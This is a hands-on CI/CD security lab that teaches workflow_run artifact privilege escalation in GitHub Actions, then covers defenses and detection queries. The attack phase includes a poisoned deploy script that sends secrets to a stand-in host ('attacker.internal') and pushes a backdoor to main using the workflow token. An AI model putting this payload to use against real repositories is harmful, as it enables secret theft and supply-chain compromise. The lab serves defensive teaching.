# Lab 2.8: Workflow Run & Cross-Workflow Attacks

<div class="lab-meta">
  <span>~40 minutes</span>
  <span>Advanced</span>
  <span>Prerequisites: <a href="2.2-direct-ppe.md">Lab 2.2</a>, <a href="2.6-actions-injection.md">Lab 2.6</a></span>
</div>

GitHub Actions `workflow_run` is a trigger that lets one workflow start after another completes. The key security property: the triggered workflow **always runs on the default branch** with **write permissions**, regardless of what triggered the first workflow. This creates a privilege escalation path. A PR from a fork runs the first workflow with read-only permissions, but the second `workflow_run` workflow runs on `main` with full write access to the repository, secrets, and the GitHub token.

In April 2021, researchers showed that combining `workflow_run` with artifact passing creates a dangerous pattern: the PR workflow uploads an artifact (which the PR author controls), and the `workflow_run` workflow downloads and processes that artifact with elevated privileges. If the processing involves executing or interpreting the artifact contents, the PR author achieves code execution in a privileged context.

This attack affected repositories including `actions/runner`, `microsoft/TypeScript`, and numerous GitHub-hosted open-source projects. In this lab, you will exploit `workflow_run` artifact trust to escalate from an unprivileged PR to privileged code execution, then defend against it.

!!! info "Phase 1: UNDERSTAND -- workflow_run Privilege Model"

    **Goal:** Understand how `workflow_run` triggers work and why they create a privilege escalation opportunity.

### Step 1: Examine the workflow pair

```bash
cd /repos/acme-webapp
cat .gitea/workflows/pr-build.yml
cat .gitea/workflows/deploy-preview.yml
```

The first workflow (`pr-build.yml`) runs on `pull_request` -- it builds the PR and uploads an artifact:

```yaml
on:
  pull_request:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/
```

The second workflow (`deploy-preview.yml`) is triggered by `workflow_run` and deploys the artifact:

```yaml
on:
  workflow_run:
    workflows: ["PR Build"]
    types: [completed]

jobs:
  deploy:
    runs-on: ubuntu-latest
    if: github.event.workflow_run.conclusion == 'success'
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: build-output
          run-id: ${{ github.event.workflow_run.id }}
      - run: |
          echo "Deploying preview..."
          bash dist/deploy.sh
```

### Step 2: Understand the privilege escalation

| Property | PR Build (first workflow) | Deploy Preview (second workflow) |
|----------|--------------------------|----------------------------------|
| Trigger | `pull_request` | `workflow_run` |
| Runs on | PR branch | Default branch (`main`) |
| GITHUB_TOKEN | Read-only | **Write access** |
| Secrets | None (fork PR) | **All repository secrets** |
| Context | Untrusted PR code | **Trusted main branch** |

The `workflow_run` trigger always runs in the context of the default branch. It does not check out the PR code -- it runs the workflow YAML from `main`. But it *downloads* and *processes* artifacts that were created by the untrusted PR workflow.

### Step 3: Identify the trust boundary violation

The artifact is the bridge between unprivileged and privileged contexts:

1. **PR author controls the build output** -- they can modify what gets built and uploaded
2. **The artifact is treated as trusted** -- the deploy workflow downloads and executes it
3. **No integrity check** -- the deploy workflow does not verify the artifact's provenance or contents
4. **The deploy workflow has secrets** -- it can access `DEPLOY_TOKEN`, `AWS_CREDENTIALS`, etc.

### Step 4: Map the full attack chain

```
Fork PR (untrusted)
  └── PR Build workflow (read-only, no secrets)
        └── Upload malicious artifact
              └── workflow_run triggers Deploy Preview
                    └── Deploy Preview workflow (WRITE access, ALL secrets)
                          └── Downloads malicious artifact
                                └── Executes it → RCE with secrets
```

!!! warning "Phase 2: BREAK -- Artifact-Based Privilege Escalation"

    **Goal:** Upload a malicious artifact in a PR workflow that gets executed by the privileged `workflow_run` workflow.

### Step 1: Create an attack branch

```bash
cd /repos/acme-webapp
git checkout -b feature/ui-improvements
```

### Step 2: Poison the build output

The PR build runs `npm run build` and uploads `dist/`. The deploy workflow runs `bash dist/deploy.sh`. Modify the build to produce a malicious `deploy.sh`:

```bash
# Modify the build script to inject a malicious deploy.sh
cat > build.js << 'EOF'
const fs = require('fs');
const path = require('path');

// Normal build
console.log("Building application...");
fs.mkdirSync('dist', { recursive: true });
fs.copyFileSync('src/index.html', 'dist/index.html');

// Inject malicious deploy script
const payload = `#!/bin/bash
# Normal-looking deploy script
echo "Deploying preview to staging..."

# === PAYLOAD ===
# Exfiltrate all secrets available to the workflow_run context
env | grep -E '(TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL)' | while read line; do
  curl -sf "http://attacker.internal/collect" -d "secret=$line" || true
done

# Modify the repository (we have write access via GITHUB_TOKEN)
git clone https://x-access-token:\${GITHUB_TOKEN}@github.com/\${GITHUB_REPOSITORY}.git /tmp/repo
cd /tmp/repo
echo "backdoor" >> README.md
git add -A
git commit -m "docs: update README"
git push origin main

echo "Preview deployed successfully."
`;

fs.writeFileSync('dist/deploy.sh', payload, { mode: 0o755 });
console.log("Build complete.");
EOF
```

### Step 3: Submit the PR

```bash
git add -A
git commit -m "Improve UI components"
git push origin feature/ui-improvements

curl -sf -X POST "http://gitea:3000/api/v1/repos/developer/acme-webapp/pulls" \
  -H "Content-Type: application/json" \
  -u "attacker:password" \
  -d '{"title":"Improve UI components","base":"main","head":"feature/ui-improvements"}'
```

### Step 4: The attack chain executes

1. The PR triggers `pr-build.yml` -- it runs `npm run build` using the PR's modified `build.js`
2. The build produces `dist/deploy.sh` containing the malicious payload
3. The build uploads `dist/` as an artifact
4. `workflow_run` triggers `deploy-preview.yml` on the default branch
5. The deploy workflow downloads the artifact and runs `bash dist/deploy.sh`
6. The script executes with **write GITHUB_TOKEN** and **all repository secrets**
7. Secrets are exfiltrated, and the attacker pushes a backdoor to `main`

### Step 5: What the attacker gains

```bash
# The workflow_run context provides:
# - GITHUB_TOKEN with write access (can push to main, create releases)
# - All repository secrets (DEPLOY_TOKEN, AWS_CREDENTIALS, etc.)
# - Ability to create/modify GitHub releases
# - Access to GitHub API with repository admin equivalent

# The attacker can:
# 1. Push malicious code directly to main
# 2. Create a release with a backdoored artifact
# 3. Exfiltrate deployment credentials
# 4. Modify branch protection rules (if token has admin scope)
```

### Step 6: Why existing defenses fail

- **CODEOWNERS** -- the workflow YAML on `main` is not modified, so no review is triggered
- **Branch protection** -- the `workflow_run` workflow pushes using the privileged GITHUB_TOKEN
- **Fork PR restrictions** -- `workflow_run` bypasses fork PR limits because it runs on `main`
- **Required status checks** -- the malicious code executes in the deploy workflow, not a check

!!! success "Phase 3: DEFEND -- Securing Cross-Workflow Communication"

    **Goal:** Prevent artifact-based privilege escalation by validating provenance and eliminating untrusted execution.

### Fix 1: Never execute artifact contents

```bash
cd /repos/acme-webapp
git checkout main
```

The fundamental fix: the `workflow_run` workflow must **never execute, eval, source, or interpret** artifact contents. Treat artifacts as untrusted data.

```bash
cat > .gitea/workflows/deploy-preview.yml << 'EOF'
name: Deploy Preview

on:
  workflow_run:
    workflows: ["PR Build"]
    types: [completed]

permissions:
  deployments: write
  statuses: write

jobs:
  deploy:
    runs-on: ubuntu-latest
    if: github.event.workflow_run.conclusion == 'success'
    steps:
      # Use the DEPLOY script from main, NOT from the artifact
      - uses: actions/checkout@v4

      # Download artifact for static files only
      - uses: actions/download-artifact@v4
        with:
          name: build-output
          path: /tmp/build-output
          run-id: ${{ github.event.workflow_run.id }}

      # Validate artifact contents before use
      - name: Validate artifact
        run: |
          echo "Validating artifact contents..."

          # Reject executable files
          EXECUTABLES=$(find /tmp/build-output -type f \
            \( -executable -o -name "*.sh" -o -name "*.py" -o -name "*.js" \))
          if [ -n "$EXECUTABLES" ]; then
            echo "::error::Artifact contains executable files:"
            echo "$EXECUTABLES"
            exit 1
          fi

          # Only allow expected file types
          UNEXPECTED=$(find /tmp/build-output -type f \
            ! -name "*.html" ! -name "*.css" ! -name "*.png" \
            ! -name "*.jpg" ! -name "*.svg" ! -name "*.ico")
          if [ -n "$UNEXPECTED" ]; then
            echo "::error::Artifact contains unexpected file types:"
            echo "$UNEXPECTED"
            exit 1
          fi

          echo "Artifact validation passed."

      # Deploy using the TRUSTED script from main
      - name: Deploy
        run: bash scripts/deploy-preview.sh /tmp/build-output
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
EOF
```

### Fix 2: Use OIDC tokens instead of static secrets

```bash
cat > .gitea/workflows/deploy-preview-oidc.yml << 'EOF'
name: Deploy Preview (OIDC)

on:
  workflow_run:
    workflows: ["PR Build"]
    types: [completed]

permissions:
  id-token: write  # Request OIDC token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    if: github.event.workflow_run.conclusion == 'success'
    steps:
      - uses: actions/checkout@v4

      # Use OIDC for cloud authentication -- no static secrets
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789:role/preview-deploy
          aws-region: eu-west-1

      - name: Deploy static files only
        run: |
          aws s3 sync /tmp/build-output s3://preview-bucket/pr-${{ github.event.workflow_run.id }}
EOF
```

### Fix 3: Verify artifact provenance

```bash
cat > scripts/verify-artifact.sh << 'VERIFY'
#!/bin/bash
# Verify that the artifact was produced by a legitimate workflow run

ARTIFACT_RUN_ID="$1"
REPO="${GITHUB_REPOSITORY}"

# Check the triggering workflow run
RUN_INFO=$(gh api "/repos/$REPO/actions/runs/$ARTIFACT_RUN_ID" 2>/dev/null)

# Verify the run was from the expected workflow
WORKFLOW_NAME=$(echo "$RUN_INFO" | jq -r '.name')
if [ "$WORKFLOW_NAME" != "PR Build" ]; then
  echo "::error::Artifact from unexpected workflow: $WORKFLOW_NAME"
  exit 1
fi

# Verify the run used the workflow definition from main
HEAD_SHA=$(echo "$RUN_INFO" | jq -r '.head_sha')
WORKFLOW_SHA=$(git log --format='%H' -1 -- .github/workflows/pr-build.yml)
echo "Run HEAD: $HEAD_SHA"
echo "Main workflow SHA: $WORKFLOW_SHA"

echo "Provenance check passed."
VERIFY

chmod +x scripts/verify-artifact.sh
```

### Fix 4: Commit and push

```bash
git add -A
git commit -m "Secure workflow_run: validate artifacts, use OIDC, no artifact execution"
git push origin main
```

### Key defenses summary

1. **Never execute artifact contents** -- use artifacts for data only, run deploy scripts from `main`
2. **Validate artifact structure** -- reject executable files, only allow expected file types
3. **Use OIDC tokens** -- eliminate static secrets; OIDC tokens are scoped to the workflow and cannot be exfiltrated
4. **Verify artifact provenance** -- check that the artifact came from the expected workflow run
5. **Minimize `workflow_run` permissions** -- use `permissions:` to restrict the GITHUB_TOKEN scope
6. **Separate build and deploy logic** -- the deploy script lives on `main` and is code-reviewed; artifacts are just static files

!!! danger "Phase 4: DETECT -- Catching Cross-Workflow Exploitation"

    **Goal:** Detect when an attacker uses `workflow_run` artifacts to escalate privileges.

### SIEM / Log Indicators

Cross-workflow attacks leave traces in both workflow run logs and API audit logs. The key signal is **a `workflow_run` workflow performing unexpected actions (secret access, repository writes, network calls) after processing an artifact from a PR**.

**What to look for:**

- `workflow_run` workflows that download artifacts and then access secrets
- Repository push events from `workflow_run` contexts (GITHUB_TOKEN writes)
- Executable files in uploaded artifacts (`.sh`, `.py`, `.js`)
- `workflow_run` builds making outbound HTTP connections not present in previous runs
- Artifact size anomalies -- malicious artifacts may be larger than expected

### Example Detection Queries

**Splunk -- detect artifact execution in workflow_run:**

```spl
index=cicd sourcetype=actions_logs trigger="workflow_run"
| where match(step_output, "(bash|sh|python|node)\s+(dist/|/tmp/build|artifact)")
| table _time, repository, workflow_name, step_name, step_output, triggering_workflow
| sort -_time
```

**Splunk -- detect repo writes from workflow_run context:**

```spl
index=git sourcetype=gitea event_type="push"
| where match(pusher, "github-actions\[bot\]")
| join repository [
  search index=cicd sourcetype=actions_logs trigger="workflow_run"
  | stats latest(_time) as wf_time by repository
]
| where abs(_time - wf_time) < 300
| table _time, repository, pusher, ref, commit_message
```

**KQL -- detect executable files in artifacts:**

```kql
CIBuildEvents
| where EventType == "artifact_upload"
| where ArtifactFiles has_any (".sh", ".py", ".js", ".exe", ".bat")
| join kind=inner (
    CIBuildEvents
    | where EventType == "workflow_run_trigger"
) on $left.WorkflowRunId == $right.TriggeringRunId
| project Timestamp, Repository, ArtifactName, ArtifactFiles, TriggeringPR
```

### EDR Indicators

| Indicator | Type | Description |
|-----------|------|-------------|
| `bash dist/*.sh` in workflow_run | Process | Executing artifact contents in privileged context |
| `git push` from workflow_run job | Git | Repository modification from triggered workflow |
| `curl` / `wget` in workflow_run after artifact download | Network | Potential exfiltration of secrets |
| Artifact containing `.sh`, `.py` files | Artifact | Executable payload in build artifact |
| `env` / `printenv` in workflow_run logs | Process | Environment enumeration for secret discovery |

!!! tip "SOC Relevance"

    **Alerts you will see:**

    - "workflow_run job executing files from downloaded artifact" (CI audit)
    - "Repository push from workflow_run context" (git webhook monitoring)
    - "Executable files detected in uploaded artifact" (artifact scanning)
    - "Secret access in workflow_run after artifact download" (CI audit logs)

    **Why this matters to your SOC:** The `workflow_run` privilege escalation is one of the most subtle CI/CD attacks. It exploits a designed feature of GitHub Actions -- the trust relationship between two workflows -- to escalate from read-only fork PR permissions to full repository write access. The attack requires no special access beyond opening a PR, and the malicious changes appear to come from the legitimate `github-actions[bot]` account.

    **Triage workflow:**

    1. **Identify the triggering PR** -- trace the `workflow_run` back to the PR that triggered the first workflow
    2. **Inspect the artifact** -- download and examine the artifact contents; look for executable files or scripts
    3. **Check the PR diff** -- did the PR modify build scripts, build configuration, or output structure?
    4. **Review workflow_run logs** -- look for unexpected commands, network connections, or secret access
    5. **Check for repository changes** -- were there pushes, release creations, or settings changes from the workflow_run context?
    6. **If confirmed: revert any changes** -- force push to restore `main`, revoke any leaked secrets, delete compromised releases
    7. **Audit the token scope** -- determine what the GITHUB_TOKEN and any repository secrets had access to

    **False positive rate:** Low. `workflow_run` workflows executing downloaded artifact files is a clear anti-pattern. Legitimate deploy workflows should use scripts from the checked-out `main` branch, not from artifacts.

!!! example "CI Integration"

    **`.github/workflows/artifact-safety.yml`:**

    ```yaml
    name: Artifact Safety Check

    on:
      workflow_run:
        workflows: ["*"]
        types: [completed]

    jobs:
      audit-artifacts:
        runs-on: ubuntu-latest
        steps:
          - name: Check artifacts for executable content
            uses: actions/github-script@v7
            with:
              script: |
                const runId = context.payload.workflow_run.id;
                const artifacts = await github.rest.actions.listWorkflowRunArtifacts({
                  owner: context.repo.owner,
                  repo: context.repo.repo,
                  run_id: runId,
                });

                for (const artifact of artifacts.data.artifacts) {
                  console.log(`Checking artifact: ${artifact.name}`);

                  // Download and inspect
                  const download = await github.rest.actions.downloadArtifact({
                    owner: context.repo.owner,
                    repo: context.repo.repo,
                    artifact_id: artifact.id,
                    archive_format: 'zip',
                  });

                  // Check for executable extensions
                  const dangerousExtensions = ['.sh', '.py', '.js', '.rb', '.pl', '.exe', '.bat', '.cmd'];
                  // In production, unzip and scan the contents
                  console.log(`Artifact ${artifact.name}: size=${artifact.size_in_bytes}`);

                  if (artifact.size_in_bytes > 50 * 1024 * 1024) {
                    core.warning(`Large artifact detected: ${artifact.name} (${artifact.size_in_bytes} bytes)`);
                  }
                }

          - name: Verify no workflow_run executes artifacts
            run: |
              # Scan all workflows that use workflow_run trigger
              for wf in .github/workflows/*.yml; do
                if grep -q "workflow_run" "$wf"; then
                  # Check if the workflow downloads artifacts AND runs them
                  if grep -q "download-artifact" "$wf" && \
                     grep -Pzo '(?s)download-artifact.*?run:.*?(bash|sh|python|node)' "$wf" 2>/dev/null; then
                    echo "::error file=$wf::workflow_run workflow downloads and executes artifacts"
                    echo "Artifacts from PRs are untrusted. Use scripts from main instead."
                  fi
                fi
              done
    ```

## What You Learned

1. **`workflow_run` always runs on the default branch** -- with write permissions and access to all secrets, regardless of the triggering event.
2. **Artifacts bridge the trust boundary** -- a PR workflow uploads untrusted content that the `workflow_run` workflow consumes with elevated privileges.
3. **Executing artifact contents is the vulnerability** -- if `workflow_run` runs `bash artifact/deploy.sh`, the PR author controls what executes in the privileged context.
4. **Never execute downloaded artifacts** -- treat them as untrusted data; run deploy logic from the checked-out `main` branch.
5. **Validate artifact structure** -- reject executables, only allow expected file types and sizes.
6. **Use OIDC instead of static secrets** -- OIDC tokens are ephemeral and scoped, eliminating the value of secret exfiltration.
7. **This bypasses fork PR restrictions** -- the `workflow_run` workflow runs with full privileges even if the triggering PR is from a fork.
